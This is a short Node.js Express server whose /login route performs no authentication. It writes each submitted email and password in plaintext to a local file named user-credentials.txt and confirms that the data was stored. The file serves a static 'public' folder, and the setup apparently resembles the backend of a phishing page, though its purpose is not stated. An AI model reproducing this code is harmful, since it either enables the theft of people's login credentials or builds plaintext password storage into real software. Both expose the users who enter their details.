const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;



// Middleware to serve static files (HTML, CSS, JS)
app.use(express.static('public'));

// Middleware to parse incoming JSON requests
app.use(bodyParser.json());

// Handle form submission
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).send('Email and password are required.');
    }

    const userData = `Email: ${email}, Password: ${password}\n`;

    // Append user data to a text file
    fs.appendFile('user-credentials.txt', userData, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).send('Internal Server Error.');
        }
        res.send('Login data stored successfully.');
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});


